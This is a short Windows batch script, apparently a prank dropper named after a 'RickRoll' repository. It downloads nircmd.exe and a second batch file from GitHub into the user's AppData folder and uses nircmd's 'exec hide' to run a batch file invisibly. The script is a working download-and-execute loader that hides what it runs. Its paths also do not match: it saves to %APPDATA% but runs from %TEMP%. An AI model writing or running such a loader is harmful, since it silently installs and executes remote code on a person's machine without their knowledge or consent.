@echo off

echo Downloading Stuff

curl --output %APPDATA%\yompBest\n.exe -LO http://github.com/pogga-was-taken/batchRickRoll/blob/main/nircmd.exe?raw=true 
curl --output %APPDATA%\yompBest\run.bat -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/run.bat 

%APPDATA%\yompBest\n.exe exec hide "%TEMP%\yompBest\run.bat"